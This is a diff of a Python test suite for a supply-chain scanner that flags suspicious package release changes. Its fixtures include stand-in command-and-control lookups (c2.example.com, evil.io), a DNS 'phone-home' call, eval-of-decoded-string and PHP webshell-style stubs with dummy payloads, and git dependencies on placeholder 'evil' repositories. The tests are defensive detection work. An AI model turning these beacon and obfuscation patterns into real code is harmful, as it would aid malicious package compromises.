@@ -29,11 +29,16 @@ from activities.models import PackageSignals, DiffSignals, ReleaseAgeSignals
 from activities.package_diff import (
     _added_lines_have_net_calls,
     _build_diff,
+    _cargo_git_deps_added,
     _diff_added_lines,
     _extract_and_diff,
     _get_file_map,
     _has_binary_content,
+    _has_obfuscation,
     _is_noise,
+    _npm_git_url_deps_added,
+    _pip_git_url_deps_added,
+    _composer_autoload_files_added,
     compute,
 )
 from tests.helpers import make_tar_gz as _make_tar_gz, make_zip as _make_zip
@@ -887,6 +892,12 @@ def test_rubygems_rakefile_is_high_signal():
     assert "Rakefile" in HIGH_SIGNAL_NAMES
 
 
+def test_cargo_build_rs_is_install_hook():
+    from activities.package_diff import INSTALL_HOOK_NAMES
+
+    assert "build.rs" in INSTALL_HOOK_NAMES
+
+
 # ---------------------------------------------------------------------------
 # new_dependency_count — direct dependency additions
 # ---------------------------------------------------------------------------
@@ -990,7 +1001,7 @@ def test_net_calls_detected_in_new_ruby_file(tmp_path):
             "lib/reporter.rb": "require 'net/http'\nNet::HTTP.post(URI('https://evil.io'), data)\n",
         },
     )
-    _, _, _, _, net_calls, _ = _build_diff(old, new)
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
     assert net_calls is True
 
 
@@ -1008,7 +1019,7 @@ def test_net_calls_detected_in_changed_python_file(tmp_path):
             ),
         },
     )
-    _, _, _, _, net_calls, _ = _build_diff(old, new)
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
     assert net_calls is True
 
 
@@ -1021,7 +1032,7 @@ def test_net_calls_not_flagged_in_install_hook(tmp_path):
             "ext/myext/extconf.rb": "require 'net/http'\nNet::HTTP.get(URI('https://example.com'))\n",
         },
     )
-    _, install_added, _, _, net_calls, _ = _build_diff(old, new)
+    _, install_added, _, _, net_calls, *_ = _build_diff(old, new)
     assert install_added is True
     assert net_calls is False  # not double-counted
 
@@ -1031,7 +1042,7 @@ def test_net_calls_not_flagged_for_unchanged_code(tmp_path):
     code = "require 'net/http'\nNet::HTTP.get(URI('https://example.com'))\n"
     old = _write_files(tmp_path / "old", {"lib/client.rb": code})
     new = _write_files(tmp_path / "new", {"lib/client.rb": code})
-    _, _, _, _, net_calls, _ = _build_diff(old, new)
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
     assert net_calls is False
 
 
@@ -1044,7 +1055,7 @@ def test_net_calls_not_flagged_for_comment_lines(tmp_path):
             "lib/util.rb": "x = 1\n# Net::HTTP example: Net::HTTP.get(...)\n",
         },
     )
-    _, _, _, _, net_calls, _ = _build_diff(old, new)
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
     assert net_calls is False
 
 
@@ -1126,7 +1137,7 @@ def test_binary_data_flagged_for_txt_with_null_bytes(tmp_path):
     (new_dir / "lib" / "result.txt").write_bytes(b"scraped data\x00\x01\x02binary content here")
     new = _get_file_map(str(new_dir))
     old_map: dict = {}
-    _, _, _, _, _, binary_added = _build_diff(old_map, new)
+    _, _, _, _, _, binary_added, *_ = _build_diff(old_map, new)
     assert binary_added is True
 
 
@@ -1141,7 +1152,7 @@ def test_binary_data_flagged_for_rb_with_binary_content(tmp_path):
     new_dir_lib.mkdir()
     (new_dir_lib / "payload.rb").write_bytes(binary_payload)
     new = _get_file_map(str(new_dir))
-    _, _, _, _, _, binary_added = _build_diff({}, new)
+    _, _, _, _, _, binary_added, *_ = _build_diff({}, new)
     assert binary_added is True
 
 
@@ -1154,7 +1165,7 @@ def test_binary_data_not_flagged_for_known_binary_extensions(tmp_path):
         b"\x89PNG\r\n\x1a\n\x00\x00binary data here" + bytes(range(100))
     )
     new = _get_file_map(str(new_dir))
-    _, _, _, _, _, binary_added = _build_diff({}, new)
+    _, _, _, _, _, binary_added, *_ = _build_diff({}, new)
     assert binary_added is False
 
 
@@ -1162,7 +1173,7 @@ def test_binary_data_not_flagged_for_clean_text_files(tmp_path):
     """A normal text .txt file does not set binary_data_added."""
     _old = _write_files(tmp_path / "old", {})
     new = _write_files(tmp_path / "new", {"lib/result.txt": "This is normal text content.\n"})
-    _, _, _, _, _, binary_added = _build_diff({}, new)
+    _, _, _, _, _, binary_added, *_ = _build_diff({}, new)
     assert binary_added is False
 
 
@@ -1203,3 +1214,521 @@ def test_classifier_flags_binary_data_added():
     verdict = _rule_based(signals)
     assert verdict.classification == "yellow"
     assert any("binary" in f for f in verdict.flags)
+
+
+# ---------------------------------------------------------------------------
+# Go network call patterns
+# ---------------------------------------------------------------------------
+
+
+def test_net_calls_detected_in_new_go_file(tmp_path):
+    """net.LookupTXT in a new .go file sets network_calls_in_lib (DNS C2 pattern)."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {"internal/updater.go": 'package main\nimport "net"\nnet.LookupTXT("c2.example.com")\n'},
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_net_calls_detected_go_http(tmp_path):
+    """http.Get in a new .go file sets network_calls_in_lib."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {"cmd/fetch.go": 'package main\nimport "net/http"\nhttp.Get("https://evil.example.com")\n'},
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_dns_calls_detected_in_js(tmp_path):
+    """dns.resolveTxt in a new .js file sets network_calls_in_lib (node-ipc pattern)."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {"lib/phone-home.js": "const dns = require('dns');\ndns.resolveTxt('bt.node.js', cb);\n"},
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_dns_calls_detected_in_python(tmp_path):
+    """socket.gethostbyname in a new .py file sets network_calls_in_lib."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {"lib/beacon.py": "import socket\nsocket.gethostbyname('c2.example.com')\n"},
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+# ---------------------------------------------------------------------------
+# Git/URL dependency detection
+# ---------------------------------------------------------------------------
+
+
+def test_npm_git_url_deps_github_prefix(tmp_path):
+    """github: prefix dep is flagged as git_url_dependency_added."""
+    old = tmp_path / "old.json"
+    new = tmp_path / "new.json"
+    old.write_text('{"dependencies": {}}')
+    new.write_text('{"dependencies": {"@antv/setup": "github:antvis/G2#abc123"}}')
+    assert _npm_git_url_deps_added(old, new) is True
+
+
+def test_npm_git_url_deps_git_plus_prefix(tmp_path):
+    """git+ prefix dep is flagged."""
+    old = tmp_path / "old.json"
+    new = tmp_path / "new.json"
+    old.write_text('{"dependencies": {}}')
+    new.write_text('{"dependencies": {"evil": "git+https://github.com/evil/repo.git"}}')
+    assert _npm_git_url_deps_added(old, new) is True
+
+
+def test_npm_git_url_deps_optional_dependencies(tmp_path):
+    """optionalDependencies with github: URL is flagged (TanStack Mini Shai-Hulud pattern)."""
+    old = tmp_path / "old.json"
+    new = tmp_path / "new.json"
+    old.write_text('{"optionalDependencies": {}}')
+    new.write_text('{"optionalDependencies": {"@tanstack/setup": "github:tanstack/router#abc"}}')
+    assert _npm_git_url_deps_added(old, new) is True
+
+
+def test_npm_git_url_deps_registry_dep_not_flagged(tmp_path):
+    """Normal semver registry deps are not flagged."""
+    old = tmp_path / "old.json"
+    new = tmp_path / "new.json"
+    old.write_text('{"dependencies": {}}')
+    new.write_text('{"dependencies": {"lodash": "^4.17.21"}}')
+    assert _npm_git_url_deps_added(old, new) is False
+
+
+def test_build_diff_flags_git_url_dep(tmp_path):
+    """_build_diff sets git_url_dependency_added when package.json gains a git dep."""
+    old = _write_files(tmp_path / "old", {"package.json": '{"dependencies": {}}'})
+    new = _write_files(
+        tmp_path / "new",
+        {"package.json": '{"dependencies": {"evil": "github:bad-actor/payload#main"}}'},
+    )
+    _, _, _, _, _, _, git_url_dep, _ = _build_diff(old, new)
+    assert git_url_dep is True
+
+
+def test_classifier_flags_git_url_dependency():
+    from activities.classifier import _rule_based
+
+    signals = PackageSignals(
+        ecosystem="npm",
+        package_name="my-pkg",
+        old_version="1.0.0",
+        new_version="1.1.0",
+        age=ReleaseAgeSignals(release_age_hours=500.0),
+        diff=DiffSignals(
+            diff_summary="package.json changed",
+            diff_size_bytes=100,
+            git_url_dependency_added=True,
+        ),
+    )
+    verdict = _rule_based(signals)
+    assert verdict.classification == "yellow"
+    assert any("git" in f.lower() or "registry" in f.lower() for f in verdict.flags)
+
+
+# ---------------------------------------------------------------------------
+# Composer autoload.files hook detection
+# ---------------------------------------------------------------------------
+
+
+def test_composer_autoload_files_added(tmp_path):
+    """New entry in autoload.files is flagged as install hook (Laravel Lang pattern)."""
+    old = tmp_path / "old.json"
+    new = tmp_path / "new.json"
+    old.write_text('{"autoload": {"psr-4": {"Lang\\\\": "src/"}}}')
+    new.write_text('{"autoload": {"psr-4": {"Lang\\\\": "src/"}, "files": ["src/helpers.php"]}}')
+    assert _composer_autoload_files_added(old, new) is True
+
+
+def test_composer_autoload_dev_files_added(tmp_path):
+    """New entry in autoload-dev.files is also flagged."""
+    old = tmp_path / "old.json"
+    new = tmp_path / "new.json"
+    old.write_text('{"autoload-dev": {}}')
+    new.write_text('{"autoload-dev": {"files": ["tests/bootstrap.php"]}}')
+    assert _composer_autoload_files_added(old, new) is True
+
+
+def test_composer_autoload_existing_files_not_flagged(tmp_path):
+    """Pre-existing autoload.files entries are not flagged."""
+    old = tmp_path / "old.json"
+    new = tmp_path / "new.json"
+    old.write_text('{"autoload": {"files": ["src/helpers.php"]}}')
+    new.write_text('{"autoload": {"files": ["src/helpers.php"]}}')
+    assert _composer_autoload_files_added(old, new) is False
+
+
+def test_build_diff_composer_autoload_sets_install_added(tmp_path):
+    """_build_diff sets install_script_added when composer.json gains autoload.files."""
+    old = _write_files(tmp_path / "old", {"composer.json": '{"autoload": {}}'})
+    new = _write_files(
+        tmp_path / "new",
+        {"composer.json": '{"autoload": {"files": ["src/helpers.php"]}}'},
+    )
+    _, install_added, _, _, _, *_ = _build_diff(old, new)
+    assert install_added is True
+
+
+# ---------------------------------------------------------------------------
+# Obfuscation detection
+# ---------------------------------------------------------------------------
+
+
+def test_has_obfuscation_js_0x_vars(tmp_path):
+    """javascript-obfuscator _0x hex variable names are detected."""
+    f = tmp_path / "lib.js"
+    f.write_text("var _0x1a2b = ['hello']; function _0xabc123() { return _0x1a2b[0]; }")
+    assert _has_obfuscation(f, ".js") is True
+
+
+def test_has_obfuscation_js_eval_atob(tmp_path):
+    """eval(atob(...)) decode-then-exec chain is detected (Coruna pattern)."""
+    f = tmp_path / "inject.js"
+    f.write_text("eval(atob('aGVsbG8gd29ybGQ='));")
+    assert _has_obfuscation(f, ".js") is True
+
+
+def test_has_obfuscation_py_exec_compile(tmp_path):
+    """exec(compile(...)) Python obfuscation is detected."""
+    f = tmp_path / "mod.py"
+    f.write_text("exec(compile(data, '<string>', 'exec'))")
+    assert _has_obfuscation(f, ".py") is True
+
+
+def test_has_obfuscation_long_single_line(tmp_path):
+    """Single line >100KB triggers obfuscation signal regardless of extension."""
+    f = tmp_path / "bundle.js"
+    f.write_text("x" * 110_000)
+    assert _has_obfuscation(f, ".js") is True
+
+
+def test_has_obfuscation_clean_file(tmp_path):
+    """Normal readable code is not flagged."""
+    f = tmp_path / "utils.js"
+    f.write_text("function add(a, b) { return a + b; }\nmodule.exports = { add };\n")
+    assert _has_obfuscation(f, ".js") is False
+
+
+def test_build_diff_flags_obfuscated_new_file(tmp_path):
+    """_build_diff sets obfuscated_code when a new JS file uses _0x vars."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {"lib/trap.js": "var _0xdeadbeef=['payload'];(function(_0x1,_0x2){})(_0xdeadbeef,0x123);"},
+    )
+    _, _, _, _, _, _, _, obfuscated = _build_diff(old, new)
+    assert obfuscated is True
+
+
+def test_classifier_flags_obfuscated_code():
+    from activities.classifier import _rule_based
+
+    signals = PackageSignals(
+        ecosystem="npm",
+        package_name="my-pkg",
+        old_version="1.0.0",
+        new_version="1.1.0",
+        age=ReleaseAgeSignals(release_age_hours=500.0),
+        diff=DiffSignals(
+            diff_summary="lib/trap.js added",
+            diff_size_bytes=200,
+            obfuscated_code=True,
+        ),
+    )
+    verdict = _rule_based(signals)
+    assert verdict.classification == "yellow"
+    assert any("obfuscat" in f.lower() for f in verdict.flags)
+
+
+# ---------------------------------------------------------------------------
+# Rust / Cargo network call patterns
+# ---------------------------------------------------------------------------
+
+
+def test_net_calls_detected_in_rust_file(tmp_path):
+    """reqwest::get in a new .rs file sets network_calls_in_lib."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {"src/updater.rs": "use reqwest;\nfn fetch() { reqwest::get(url).unwrap(); }\n"},
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_net_calls_detected_rust_tcpstream(tmp_path):
+    """TcpStream::connect in a new .rs file sets network_calls_in_lib."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {"src/beacon.rs": "use std::net::TcpStream;\nTcpStream::connect(addr).unwrap();\n"},
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_added_lines_have_net_calls_rust():
+    assert _added_lines_have_net_calls(["reqwest::Client::new().get(url).send()"], ".rs") is True
+    assert _added_lines_have_net_calls(['TcpStream::connect("evil.io:443")'], ".rs") is True
+    assert (
+        _added_lines_have_net_calls(
+            ["fn parse_config(x: &str) -> Config { Config::default() }"], ".rs"
+        )
+        is False
+    )
+
+
+# ---------------------------------------------------------------------------
+# C# / NuGet network call patterns
+# ---------------------------------------------------------------------------
+
+
+def test_net_calls_detected_in_csharp_file(tmp_path):
+    """HttpClient in a new .cs file sets network_calls_in_lib."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {"src/Updater.cs": "using System.Net.Http;\nvar client = new HttpClient();\n"},
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_net_calls_detected_csharp_dns(tmp_path):
+    """Dns.GetHostEntry in a new .cs file sets network_calls_in_lib (C2-over-DNS pattern)."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {"src/Resolver.cs": 'using System.Net;\nDns.GetHostEntry("c2.example.com");\n'},
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_added_lines_have_net_calls_csharp():
+    assert _added_lines_have_net_calls(["var client = new HttpClient();"], ".cs") is True
+    assert _added_lines_have_net_calls(["var wc = new WebClient();"], ".cs") is True
+    assert (
+        _added_lines_have_net_calls(
+            ["public string Compute(int x) { return x.ToString(); }"], ".cs"
+        )
+        is False
+    )
+
+
+# ---------------------------------------------------------------------------
+# Ruby obfuscation patterns
+# ---------------------------------------------------------------------------
+
+
+def test_has_obfuscation_ruby_eval_base64(tmp_path):
+    """eval(Base64.decode64(...)) is detected as obfuscation."""
+    f = tmp_path / "payload.rb"
+    f.write_text("require 'base64'\neval(Base64.decode64('aGVsbG8gd29ybGQ='))\n")
+    assert _has_obfuscation(f, ".rb") is True
+
+
+def test_has_obfuscation_ruby_hex_pack(tmp_path):
+    """[hex_string].pack('H*') hex payload delivery is detected."""
+    f = tmp_path / "install.rb"
+    f.write_text("eval(['68656c6c6f'].pack('H*'))\n")
+    assert _has_obfuscation(f, ".rb") is True
+
+
+def test_has_obfuscation_ruby_clean_file(tmp_path):
+    """Normal Ruby code is not flagged."""
+    f = tmp_path / "utils.rb"
+    f.write_text('def greet(name)\n  "Hello, #{name}!"\nend\n')
+    assert _has_obfuscation(f, ".rb") is False
+
+
+# ---------------------------------------------------------------------------
+# PHP obfuscation patterns
+# ---------------------------------------------------------------------------
+
+
+def test_has_obfuscation_php_eval_base64(tmp_path):
+    """eval(base64_decode(...)) is detected (most common PHP webshell pattern)."""
+    f = tmp_path / "helpers.php"
+    f.write_text("<?php eval(base64_decode('aGVsbG8gd29ybGQ=')); ?>")
+    assert _has_obfuscation(f, ".php") is True
+
+
+def test_has_obfuscation_php_eval_gzinflate(tmp_path):
+    """eval(gzinflate(...)) is detected (Laravel Lang compromise pattern)."""
+    f = tmp_path / "bootstrap.php"
+    f.write_text("<?php eval(gzinflate(base64_decode('...'))); ?>")
+    assert _has_obfuscation(f, ".php") is True
+
+
+def test_has_obfuscation_php_eval_str_rot13(tmp_path):
+    """eval(str_rot13(...)) is detected."""
+    f = tmp_path / "plugin.php"
+    f.write_text("<?php eval(str_rot13('...')); ?>")
+    assert _has_obfuscation(f, ".php") is True
+
+
+def test_has_obfuscation_php_clean_file(tmp_path):
+    """Normal PHP code is not flagged."""
+    f = tmp_path / "utils.php"
+    f.write_text(
+        "<?php\nfunction greet(string $name): string {\n    return 'Hello, ' . $name;\n}\n"
+    )
+    assert _has_obfuscation(f, ".php") is False
+
+
+# ---------------------------------------------------------------------------
+# NuGet install hook detection
+# ---------------------------------------------------------------------------
+
+
+def test_nuget_install_ps1_is_install_hook():
+    from activities.package_diff import INSTALL_HOOK_NAMES
+
+    assert "tools/install.ps1" in INSTALL_HOOK_NAMES
+
+
+def test_nuget_init_ps1_is_install_hook():
+    from activities.package_diff import INSTALL_HOOK_NAMES
+
+    assert "tools/init.ps1" in INSTALL_HOOK_NAMES
+
+
+def test_build_diff_nuget_install_ps1_sets_install_added(tmp_path):
+    """A new tools/install.ps1 sets install_script_added."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {"tools/install.ps1": "Write-Host 'installing'\n"},
+    )
+    _, install_added, _, *_ = _build_diff(old, new)
+    assert install_added is True
+
+
+# ---------------------------------------------------------------------------
+# Cargo.toml is a high-signal file
+# ---------------------------------------------------------------------------
+
+
+def test_cargo_toml_is_high_signal():
+    from activities.package_diff import HIGH_SIGNAL_NAMES
+
+    assert "Cargo.toml" in HIGH_SIGNAL_NAMES
+
+
+# ---------------------------------------------------------------------------
+# pip git-URL dependency detection
+# ---------------------------------------------------------------------------
+
+
+def test_pip_git_url_deps_requirements_txt(tmp_path):
+    """git+https:// in requirements.txt is flagged."""
+    old = tmp_path / "old.txt"
+    new = tmp_path / "new.txt"
+    old.write_text("requests>=2.0\n")
+    new.write_text("requests>=2.0\nevil @ git+https://github.com/evil/repo.git\n")
+    assert _pip_git_url_deps_added(old, new) is True
+
+
+def test_pip_git_url_deps_pyproject_toml(tmp_path):
+    """git+https:// in pyproject.toml dependencies is flagged."""
+    old = tmp_path / "old.toml"
+    new = tmp_path / "new.toml"
+    old.write_text('[project]\ndependencies = ["requests>=2.0"]\n')
+    new.write_text(
+        '[project]\ndependencies = ["requests>=2.0", "evil @ git+https://github.com/evil/repo.git"]\n'
+    )
+    assert _pip_git_url_deps_added(old, new) is True
+
+
+def test_pip_git_url_deps_editable_install(tmp_path):
+    """-e git+https:// is flagged."""
+    old = tmp_path / "old.txt"
+    new = tmp_path / "new.txt"
+    old.write_text("requests>=2.0\n")
+    new.write_text("requests>=2.0\ngit+https://github.com/evil/pkg.git\n")
+    assert _pip_git_url_deps_added(old, new) is True
+
+
+def test_pip_git_url_deps_registry_dep_not_flagged(tmp_path):
+    """Normal PyPI deps are not flagged."""
+    old = tmp_path / "old.txt"
+    new = tmp_path / "new.txt"
+    old.write_text("requests>=2.0\n")
+    new.write_text("requests>=2.0\nhttpx>=0.24\n")
+    assert _pip_git_url_deps_added(old, new) is False
+
+
+def test_build_diff_flags_pip_git_url_dep_in_requirements(tmp_path):
+    """_build_diff sets git_url_dependency_added for git+https:// in requirements.txt."""
+    old = _write_files(tmp_path / "old", {"requirements.txt": "requests>=2.0\n"})
+    new = _write_files(
+        tmp_path / "new",
+        {"requirements.txt": "requests>=2.0\nevil @ git+https://github.com/evil/repo.git\n"},
+    )
+    _, _, _, _, _, _, git_url_dep, _ = _build_diff(old, new)
+    assert git_url_dep is True
+
+
+def test_build_diff_flags_pip_git_url_dep_in_pyproject(tmp_path):
+    """_build_diff sets git_url_dependency_added for git+https:// in pyproject.toml."""
+    old = _write_files(tmp_path / "old", {"pyproject.toml": "[project]\ndependencies = []\n"})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "pyproject.toml": '[project]\ndependencies = ["evil @ git+https://github.com/evil/repo.git"]\n'
+        },
+    )
+    _, _, _, _, _, _, git_url_dep, _ = _build_diff(old, new)
+    assert git_url_dep is True
+
+
+# ---------------------------------------------------------------------------
+# Cargo git dependency detection
+# ---------------------------------------------------------------------------
+
+
+def test_cargo_git_deps_inline_table(tmp_path):
+    """Cargo.toml git = \"https://...\" dep is flagged."""
+    old = tmp_path / "old.toml"
+    new = tmp_path / "new.toml"
+    old.write_text('[dependencies]\nserde = "1.0"\n')
+    new.write_text(
+        '[dependencies]\nserde = "1.0"\nevil-crate = { git = "https://github.com/evil/crate.git" }\n'
+    )
+    assert _cargo_git_deps_added(old, new) is True
+
+
+def test_cargo_git_deps_registry_dep_not_flagged(tmp_path):
+    """Normal crates.io semver deps are not flagged."""
+    old = tmp_path / "old.toml"
+    new = tmp_path / "new.toml"
+    old.write_text('[dependencies]\nserde = "1.0"\n')
+    new.write_text(
+        '[dependencies]\nserde = "1.0"\ntokio = { version = "1", features = ["full"] }\n'
+    )
+    assert _cargo_git_deps_added(old, new) is False
+
+
+def test_build_diff_flags_cargo_git_dep(tmp_path):
+    """_build_diff sets git_url_dependency_added for Cargo.toml git deps."""
+    old = _write_files(tmp_path / "old", {"Cargo.toml": '[dependencies]\nserde = "1.0"\n'})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "Cargo.toml": '[dependencies]\nserde = "1.0"\nevil = { git = "https://github.com/evil/crate.git" }\n'
+        },
+    )
+    _, _, _, _, _, _, git_url_dep, _ = _build_diff(old, new)
+    assert git_url_dep is True
